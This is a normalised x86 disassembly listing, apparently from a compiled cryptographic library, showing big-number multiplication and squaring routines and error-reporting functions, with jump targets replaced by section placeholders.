mov eax [ esi + 0x8 ]
push 0x0
mul [ esi + 0x14 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x28 ]
inc [ esp + 0x28 ]
mov ecx [ esp + 0x10 ]
add ecx eax
cmp ecx eax
mov [ esp + 0x10 ] ecx
jae r-xdata
jb r-xdata
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x28 ]
cmp eax ebx
jae r-xdata
mov eax [ esi + 0xc ]
push 0x0
mul [ esi + 0x10 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x28 ]
inc [ esp + 0x28 ]
mov edi [ esp + 0x28 ]
jb r-xdata
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
mov edi [ esp + 0x28 ]
inc edi
jmp r-xdata
cmp eax ebx
jae r-xdata
mov eax [ esp + 0x24 ]
mov [ eax + 0x1c ] ecx
mov eax [ esi + 0x10 ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
mov [ esp + 0x20 ] ecx
call sub_1001d090
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
inc edi
mov ecx [ esp + 0x10 ]
add ecx eax
cmp ecx eax
jae r-xdata
add edi edx
cmp edi edx
mov [ esp + 0x28 ] edi
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
push 0x0
mul [ esi + 0x14 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
mov [ esp + 0x10 ] 0x1
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x10 ]
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x8 ]
push 0x0
mul [ esi + 0x18 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x10 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x10 ]
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x1c ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x10 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x10 ]
cmp eax ebx
jae r-xdata
mov ecx [ esp + 0x24 ]
push 0x0
push 0x2
mov [ esp + 0x1c ] 0x0
mov [ ecx + 0x20 ] ebp
mov eax [ esi + 0x1c ]
mul [ esi + 0x8 ]
mov edi edx
mov ebx eax
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x10 ]
mov ecx [ esp + 0x28 ]
add ecx eax
cmp ecx eax
mov [ esp + 0x28 ] ecx
jae r-xdata
jb r-xdata
mov ebp [ esp + 0x10 ]
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
mov [ esp + 0x14 ] 0x1
cmp eax ebx
jae r-xdata
mov eax [ esi + 0xc ]
push 0x0
mul [ esi + 0x18 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
add ecx eax
cmp ecx eax
mov [ esp + 0x28 ] ecx
jae r-xdata
jb r-xdata
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x14 ]
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x10 ]
push 0x0
mul [ esi + 0x14 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x14 ]
inc [ esp + 0x14 ]
mov edi [ esp + 0x14 ]
jb r-xdata
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
mov edi [ esp + 0x14 ]
inc edi
jmp r-xdata
cmp eax ebx
jae r-xdata
mov edx [ esp + 0x24 ]
mov [ edx + 0x24 ] ecx
mov eax [ esi + 0x14 ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
mov [ esp + 0x38 ] ecx
call sub_1001d090
add ebp eax
cmp ebp eax
jae r-xdata
inc edi
inc edi
mov ecx [ esp + 0x28 ]
add ecx eax
cmp ecx eax
jae r-xdata
add edi edx
cmp edi edx
mov [ esp + 0x14 ] edi
jae r-xdata
inc edx
mov eax [ esi + 0x10 ]
push 0x0
mul [ esi + 0x18 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
mov [ esp + 0x28 ] 0x1
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x14 ]
add eax edx
cmp eax edx
mov [ esp + 0x14 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x28 ]
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x1c ]
push 0x0
mul [ esi + 0xc ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x28 ]
inc [ esp + 0x28 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x14 ]
add eax edx
cmp eax edx
mov [ esp + 0x14 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x28 ]
cmp eax ebx
jae r-xdata
mov eax [ esp + 0x24 ]
push 0x0
push 0x2
mov [ esp + 0x18 ] 0x0
mov [ eax + 0x28 ] ebp
mov eax [ esi + 0x1c ]
mul [ esi + 0x10 ]
mov edi edx
mov ebx eax
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x28 ]
inc [ esp + 0x28 ]
mov ebp [ esp + 0x14 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
mov [ esp + 0x10 ] 0x1
cmp eax ebx
jae r-xdata
mov eax [ esi + 0x18 ]
push 0x0
mul [ esi + 0x14 ]
mov edi edx
mov ebx eax
push 0x2
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x10 ]
add ebp eax
cmp ebp eax
mov [ esp + 0x14 ] ebp
jae r-xdata
jb r-xdata
mov eax [ esp + 0x28 ]
add eax edx
cmp eax edx
mov [ esp + 0x28 ] eax
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x10 ]
cmp eax ebx
jae r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x14 ]
xor ebp ebp
mov [ ecx + 0x2c ] edx
mov eax [ esi + 0x18 ]
xor ecx ecx
push ecx
push eax
push ecx
push eax
call sub_1001d090
mov ebx [ esp + 0x28 ]
add ebx eax
cmp ebx eax
jae r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax edx
cmp eax edx
mov [ esp + 0x10 ] eax
jae r-xdata
inc edx
mov eax [ esi + 0x1c ]
push 0x0
mul [ esi + 0x14 ]
mov edi edx
push 0x2
push edi
push eax
mov [ esp + 0x28 ] eax
call sub_1001d090
cmp edx edi
ja r-xdata
mov ebp 0x1
add ebx eax
cmp ebx eax
mov [ esp + 0x28 ] ebx
jae r-xdata
jb r-xdata
mov eax [ esp + 0x10 ]
add eax edx
cmp eax edx
mov [ esp + 0x10 ] eax
jae r-xdata
inc edx
jne r-xdata
inc ebp
cmp eax [ esp + 0x18 ]
jae r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
push 0x0
push 0x2
mov [ ecx + 0x30 ] eax
mov eax [ esi + 0x1c ]
mul [ esi + 0x18 ]
mov edi edx
mov ebx eax
push edi
push ebx
mov [ esp + 0x38 ] 0x0
call sub_1001d090
cmp edx edi
ja r-xdata
inc ebp
inc ebp
mov ebx [ esp + 0x28 ]
jb r-xdata
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
mov ebx 0x1
jmp r-xdata
cmp eax ebx
jae r-xdata
mov edi [ esp + 0x24 ]
xor eax eax
push eax
mov [ edi + 0x34 ] ecx
mov esi [ esi + 0x1c ]
push esi
push eax
push esi
call sub_1001d090
add ebp eax
cmp ebp eax
jae r-xdata
inc ebx
inc ebx
mov ecx [ esp + 0x10 ]
add ecx eax
cmp ecx eax
jae r-xdata
add ebx edx
mov [ edi + 0x38 ] ebp
mov [ edi + 0x3c ] ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
inc edx
sub_10054900
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
xor ecx ecx
push edi
mov eax [ esi ]
push ecx
push eax
push ecx
push eax
call sub_1001d090
mov ecx [ esp + 0x20 ]
mov ebx edx
push 0x0
push 0x2
mov [ ecx ] eax
mov eax [ esi ]
mul [ esi + 0x4 ]
mov edi edx
mov ebp eax
push edi
push ebp
mov [ esp + 0x20 ] 0x0
call sub_1001d090
cmp edx edi
ja r-xdata
mov ebp [ esp + 0x10 ]
jb r-xdata
mov edi edx
mov edx [ esp + 0x20 ]
xor ecx ecx
mov [ edx + 0x4 ] ebx
mov eax [ esi + 0x4 ]
push ecx
push eax
push ecx
push eax
xor ebx ebx
call sub_1001d090
add edi eax
cmp edi eax
jae r-xdata
inc edx
jne r-xdata
mov ebp 0x1
jmp r-xdata
cmp eax ebp
jae r-xdata
add ebp edx
cmp ebp edx
mov [ esp + 0x10 ] ebp
jae r-xdata
inc edx
inc ebp
add ebx eax
cmp ebx eax
jae r-xdata
mov eax [ esi + 0x8 ]
push 0x0
mul [ esi ]
mov ebp edx
push 0x2
push ebp
push eax
mov [ esp + 0x24 ] eax
call sub_1001d090
cmp edx ebp
ja r-xdata
mov ebx 0x1
add edi eax
cmp edi eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x10 ]
add eax edx
cmp eax edx
mov [ esp + 0x10 ] eax
jae r-xdata
inc edx
jne r-xdata
inc ebx
cmp eax [ esp + 0x14 ]
jae r-xdata
mov eax [ esp + 0x20 ]
push 0x0
push 0x2
mov [ esp + 0x2c ] 0x0
mov [ eax + 0x8 ] edi
mov eax [ esi + 0xc ]
mul [ esi ]
mov edi edx
mov ebp eax
push edi
push ebp
call sub_1001d090
cmp edx edi
ja r-xdata
inc ebx
inc ebx
mov ebp [ esp + 0x10 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
jne r-xdata
mov [ esp + 0x24 ] 0x1
cmp eax ebp
jae r-xdata
mov eax [ esi + 0x8 ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
push 0x2
push edi
push eax
mov [ esp + 0x24 ] eax
call sub_1001d090
cmp edx edi
ja r-xdata
inc [ esp + 0x24 ]
inc [ esp + 0x24 ]
add ebp eax
cmp ebp eax
jae r-xdata
jb r-xdata
add ebx edx
cmp ebx edx
jae r-xdata
inc edx
jne r-xdata
inc [ esp + 0x24 ]
cmp eax [ esp + 0x14 ]
jae r-xdata
mov ecx [ esp + 0x20 ]
mov [ ecx + 0xc ] ebp
mov eax [ esi + 0x8 ]
xor ecx ecx
xor ebp ebp
push ecx
push eax
push ecx
push eax
call sub_1001d090
add ebx eax
cmp ebx eax
jae r-xdata
inc [ esp + 0x24 ]
inc [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
add eax edx
cmp eax edx
mov [ esp + 0x24 ] eax
jae r-xdata
inc edx
mov eax [ esi + 0xc ]
push 0x0
mul [ esi + 0x4 ]
mov edi edx
push 0x2
push edi
push eax
mov [ esp + 0x24 ] eax
call sub_1001d090
cmp edx edi
ja r-xdata
mov ebp 0x1
add ebx eax
cmp ebx eax
jae r-xdata
jb r-xdata
mov eax [ esp + 0x24 ]
add eax edx
cmp eax edx
mov [ esp + 0x24 ] eax
jae r-xdata
inc edx
jne r-xdata
inc ebp
cmp eax [ esp + 0x14 ]
jae r-xdata
mov edx [ esp + 0x20 ]
push 0x0
push 0x2
mov [ esp + 0x18 ] 0x0
mov [ edx + 0x10 ] ebx
mov eax [ esi + 0x8 ]
mul [ esi + 0xc ]
mov edi edx
mov ebx eax
push edi
push ebx
call sub_1001d090
cmp edx edi
ja r-xdata
inc ebp
inc ebp
mov ebx [ esp + 0x10 ]
jb r-xdata
add ebp edx
cmp ebp edx
jae r-xdata
inc edx
jne r-xdata
mov ebx 0x1
jmp r-xdata
cmp eax ebx
jae r-xdata
mov edi [ esp + 0x20 ]
xor eax eax
push eax
mov [ edi + 0x14 ] ecx
mov esi [ esi + 0xc ]
push esi
push eax
push esi
call sub_1001d090
add ebp eax
cmp ebp eax
jae r-xdata
inc ebx
inc ebx
mov ecx [ esp + 0x24 ]
add ecx eax
cmp ecx eax
jae r-xdata
add ebx edx
mov [ edi + 0x18 ] ebp
mov [ edi + 0x1c ] ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
inc edx
sub_10054b60
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
cmp eax edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
je r-xdata
push 0x64
push r--data
push 0x43
push eax
call sub_1002cb10
mov esi eax
add esp 0x4
cmp esi edi
je r-xdata
mov ebx [ esp + 0x24 ]
cmp ebx edi
jne r-xdata
push ebp
call sub_100299b0
mov edi eax
call sub_100299b0
mov ebp eax
mov [ esp + 0x10 ] ebp
call sub_100299b0
mov [ esp + 0x24 ] eax
call sub_100299b0
test edi edi
mov [ esp + 0x14 ] eax
je r-xdata
call sub_1002dc50
mov ebx eax
cmp ebx edi
jne r-xdata
push 0x79
push r--data
push 0x41
test ebp ebp
je r-xdata
push 0x6c
push r--data
push 0x41
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push edi
call sub_100298f0
add esp 0x4
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
push 0x67
push 0x2a
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x28 ]
pop ebp
test eax eax
jne r-xdata
push eax
call sub_100298f0
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push ebx
call sub_1002dcb0
add esp 0x4
push esi
call sub_1002d150
mov ebp eax
add esp 0x4
test ebp ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esp + 0x24 ]
push ebx
push eax
push esi
call sub_1002cb20
add esp 0xc
test eax eax
jne r-xdata
push 0x7e
push r--data
push 0x10
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_1002d200
add esp 0x4
mov ecx [ esp + 0x24 ]
push ecx
push edi
call sub_100494a0
add esp 0x8
test eax eax
je r-xdata
push 0x83
push r--data
push 0x10
jmp r-xdata
push 0x67
push 0x2a
call sub_1001de60
add esp 0x14
test edi edi
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
push eax
call sub_100298f0
add esp 0x4
push 0x8e
push r--data
push 0x68
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push ebx
push 0x0
push 0x0
push edi
push ebp
push esi
call sub_1002db90
add esp 0x18
test eax eax
je r-xdata
push 0x96
push r--data
push 0x10
jmp r-xdata
push esi
call sub_1002c960
push eax
call sub_1002c960
add esp 0x8
cmp eax 0x196
push ebx
push 0x0
jne r-xdata
mov eax [ esp + 0x1c ]
push eax
push ebp
push esi
call sub_1002d620
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
push edx
push ebp
push esi
call sub_1002d5b0
add esp 0x14
test eax eax
je r-xdata
push 0xa7
push r--data
push 0x10
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push ebx
push ecx
push edx
push eax
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
push 0x9e
push r--data
push 0x10
jmp r-xdata
jmp r-xdata
push 0xad
push r--data
push 0x3
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
push ebx
push edx
push edi
push edi
call sub_10036f90
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
mov ebp [ esp + 0x30 ]
mov eax [ ebp ]
test eax eax
je r-xdata
push 0xb6
push r--data
push 0x3
jmp r-xdata
mov esi [ esp + 0x2c ]
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esp + 0x10 ]
mov [ esp + 0x1c ] 0x1
mov [ ebp ] eax
mov [ esi ] edi
jmp r-xdata
push eax
call sub_100298f0
add esp 0x4
sub_10054e30
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x30 ]
push esi
push edi
xor esi esi
push ebp
mov [ esp + 0x20 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
call sub_10036220
push ebp
mov edi eax
call sub_1002cb10
push ebp
mov ebx eax
call sub_1002b5d0
add esp 0xc
cmp ebx esi
mov [ esp + 0x20 ] eax
je r-xdata
push 0xe6
push r--data
push 0x43
cmp eax esi
je r-xdata
cmp edi esi
je r-xdata
call sub_1004ef50
cmp eax esi
mov [ esp + 0x10 ] eax
jne r-xdata
mov ebp [ eax + 0x4 ]
call sub_1002dc50
mov edi eax
test edi edi
je r-xdata
push 0xed
push r--data
push 0x41
jmp r-xdata
push 0xf5
call sub_100299b0
mov esi eax
test esi esi
je r-xdata
push 0x65
push 0x2a
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
test edi edi
je r-xdata
call sub_100299b0
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push edi
call sub_1002dcb0
add esp 0x4
call sub_100299b0
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
push edi
push esi
push ebx
call sub_1002cb20
add esp 0xc
test eax eax
jne r-xdata
test esi esi
je r-xdata
push eax
call sub_100298f0
add esp 0x4
push esi
call sub_10029870
mov ecx [ esp + 0x30 ]
add esp 0x4
lea edx [ ecx * 8 ]
cmp edx eax
jle r-xdata
push 0xfb
push r--data
push 0x10
jmp r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push esi
call sub_10029950
add esp 0x4
mov eax [ esp + 0x14 ]
push eax
push ecx
mov ecx [ esp + 0x30 ]
push ecx
call sub_10029d50
add esp 0xc
test eax eax
jne r-xdata
push 0x109
push r--data
push 0x65
jmp r-xdata
push 0x65
push 0x2a
call sub_1001de60
mov ecx [ esp + 0x24 ]
add esp 0x14
push ecx
call sub_1004ef60
add esp 0x4
xor ebx ebx
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x14
retn
push eax
call sub_100298f0
add esp 0x4
mov ebx [ esp + 0x30 ]
test ebx ebx
je r-xdata
push 0x10f
push r--data
push 0x3
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x38 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
push edi
push eax
call sub_1002e3d0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
test eax eax
je r-xdata
push 0x118
push r--data
push 0x2a
jmp r-xdata
mov ebx [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ edx ]
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
push 0x129
push r--data
push 0x3
jmp r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
push esi
push edx
push eax
push ebp
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
push 0x122
jmp r-xdata
jmp r-xdata
push 0x12e
push r--data
push 0x3
jmp r-xdata
push edi
push esi
push ebx
push ebp
push ebp
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
push r--data
push 0x41
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
push edi
push esi
mov edx [ ecx ]
mov ecx [ esp + 0x20 ]
push edx
push eax
push ecx
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
push 0x133
push r--data
push 0x3
jmp r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
jne r-xdata
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
push 0x13c
push r--data
push 0x6a
jmp r-xdata
jmp r-xdata
sub_10055100
mov eax 0x14
call sub_1001d0d0
push ebp
push esi
mov esi [ esp + 0x2c ]
mov [ esp + 0xc ] 0xffffffff
test esi esi
mov [ esp + 0x8 ] 0x0
je r-xdata
push 0x168
push r--data
push 0x67
push esi
call sub_1002cb10
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
push esi
call sub_1002b600
add esp 0x4
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
call sub_1002dc50
mov esi eax
test esi esi
jne r-xdata
push ebx
push edi
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebx eax
call sub_1002de70
push esi
mov [ esp + 0x2c ] eax
call sub_1002de70
push esi
mov edi eax
call sub_1002de70
push esi
mov [ esp + 0x30 ] eax
call sub_1002de70
add esp 0x18
mov [ esp + 0x34 ] eax
test eax eax
jne r-xdata
push 0x16f
push r--data
push 0x41
jmp r-xdata
push esi
push ebx
push ebp
call sub_1002cb20
add esp 0xc
test eax eax
jne r-xdata
push 0x17a
jmp r-xdata
push 0x66
push 0x2a
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
pop ebp
add esp 0x14
retn
push ebx
call sub_10029870
mov ecx [ esp + 0x30 ]
add esp 0x4
lea edx [ ecx * 8 ]
cmp edx eax
jle r-xdata
push 0x180
push r--data
push 0x10
push 0x66
push 0x2a
call sub_1001de60
add esp 0x14
jmp r-xdata
push r--data
push 0x3
push 0x66
push 0x2a
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x30 ]
mov eax [ eax ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
push 0x18e
push r--data
push 0x65
jmp r-xdata
push esi
call sub_1002de00
push esi
call sub_1002dcb0
mov eax [ esp + 0x18 ]
add esp 0x8
test eax eax
pop edi
pop ebx
je r-xdata
push 0x197
push r--data
push 0x64
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x66
push 0x2a
call sub_1001de60
add esp 0x14
mov [ esp + 0x14 ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
add esp 0x14
retn
push eax
call sub_1002d200
add esp 0x4
push ebx
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push ebx
push eax
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov edx [ esp + 0x30 ]
push esi
push ebx
mov eax [ edx + 0x4 ]
push eax
push edi
call sub_10036f90
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x28 ]
push ecx
push edx
push eax
call sub_10029d50
add esp 0xc
test eax eax
jne r-xdata
push 0x19e
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
push esi
push ebx
push edi
push ecx
push edx
call sub_10057b10
add esp 0x14
test eax eax
jne r-xdata
push 0x1a4
jmp r-xdata
mov eax [ esp + 0x30 ]
push esi
push ebx
push edi
mov ecx [ eax ]
push ecx
push edi
call sub_10057b10
add esp 0x14
test eax eax
jne r-xdata
push 0x1aa
jmp r-xdata
push ebp
call sub_1002d150
add esp 0x4
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
push 0x1b0
jmp r-xdata
mov edx [ esp + 0x20 ]
push esi
push edi
mov edi [ esp + 0x24 ]
push edx
push edi
push eax
push ebp
call sub_1002db90
add esp 0x18
test eax eax
jne r-xdata
push 0x1b6
push r--data
push 0x41
push 0x66
push 0x2a
call sub_1001de60
add esp 0x14
jmp r-xdata
push ebp
call sub_1002c960
push eax
call sub_1002c960
add esp 0x8
cmp eax 0x196
push esi
push 0x0
jne r-xdata
push 0x1bb
jmp r-xdata
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x18 ]
push edx
push eax
push ebp
call sub_1002d620
add esp 0x14
test eax eax
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push ebp
call sub_1002d5b0
add esp 0x14
test eax eax
jne r-xdata
push r--data
push 0x10
push 0x66
push 0x2a
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx [ esp + 0x34 ]
push esi
push ebx
push ecx
push edi
call sub_100579b0
add esp 0x10
test eax eax
jne r-xdata
push 0x1cc
push 0x1c3
jmp r-xdata
mov edx [ esp + 0x30 ]
mov eax [ edx ]
push eax
push edi
call sub_10029fb0
add esp 0x8
neg eax
sbb eax eax
inc eax
mov [ esp + 0x14 ] eax
jmp r-xdata
push 0x1d3
sub_100554b0
mov eax 0x38
call sub_1001d0d0
push ebx
push ebp
push esi
lea eax [ esp + 0x1c ]
push edi
xor ebx ebx
push eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] ebx
xor edi edi
mov [ esp + 0x20 ] 0x3
mov [ esp + 0x1c ] ebx
call sub_10029990
lea ecx [ esp + 0x38 ]
push ecx
call sub_10029990
mov esi [ esp + 0x5c ]
add esp 0x8
cmp [ esi + 0xc ] ebx
je r-xdata
mov [ esp + 0x1c ] 0x65
cmp [ esi + 0x10 ] ebx
je r-xdata
lea edx [ esp + 0x20 ]
push edx
call sub_100298f0
lea eax [ esp + 0x38 ]
push eax
call sub_100298f0
mov eax [ esp + 0x1c ]
add esp 0x8
test eax eax
pop edi
pop esi
pop ebp
pop ebx
je r-xdata
push ebx
call sub_1002dcb0
add esp 0x4
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esp + 0x8 ]
add esp 0x38
retn
push eax
call sub_100298f0
add esp 0x4
call sub_100299b0
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esp + 0x1c ]
push 0xc0
push r--data
push eax
push 0x70
push 0xa
call sub_1001de60
mov ecx [ esp + 0x24 ]
push ecx
call sub_10029950
push edi
call sub_10029950
add esp 0x1c
mov edx [ esi + 0x10 ]
push edx
call sub_10029870
add eax 0x7
mov ebp [ esp + 0x54 ]
cdq
and edx 0x7
add esp 0x4
add eax edx
sar eax 0x3
cmp ebp eax
jg r-xdata
mov [ esp + 0x1c ] 0x64
jmp r-xdata
cmp ebp 0x32
jg r-xdata
call sub_1002dc50
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ esi + 0x20 ]
xor edx edx
cmp ecx edx
je r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push ebx
push esi
call sub_1004f010
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
cmp eax edx
je r-xdata
mov eax [ esp + 0x4c ]
lea edx [ esp + 0x20 ]
push edx
push ebp
push eax
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x14 ] ecx
mov [ esi + 0x20 ] edx
mov [ esp + 0x10 ] eax
mov [ esi + 0x24 ] edx
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ esp + 0x10 ]
mov eax [ esi + 0x1c ]
push ebx
push ecx
push edx
lea ecx [ esp + 0x40 ]
push eax
push ecx
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x34 ]
push edx
push eax
push edi
call sub_10038680
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
push edi
call sub_1002a000
add esp 0x8
test eax eax
jle r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ esp + 0x14 ]
push ebx
push eax
push ecx
push edi
push edi
call sub_10057b10
add esp 0x14
test eax eax
je r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
push edi
call sub_10038960
add esp 0xc
call sub_1004ef80
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
mov edx [ esp + 0x10 ]
mov [ eax + 0x4 ] edi
mov [ eax ] edx
jmp r-xdata
test ebx ebx
je r-xdata
sub_100556c0
mov eax 0x30
call sub_1001d0d0
push ebp
push esi
mov esi [ esp + 0x3c ]
push edi
xor edi edi
